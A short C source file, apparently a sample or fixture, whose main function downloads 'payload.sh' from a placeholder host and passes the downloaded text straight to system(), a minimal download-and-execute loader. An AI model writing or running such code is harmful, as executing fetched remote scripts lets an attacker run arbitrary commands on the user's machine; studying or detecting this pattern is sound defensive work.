#include <stdlib.h>

extern char *download(const char *url);

static void launch(const char *url) {
    char *payload = download(url);
    system(payload);
}

int main(void) {
    launch("https://example.invalid/payload.sh");
    return 0;
}
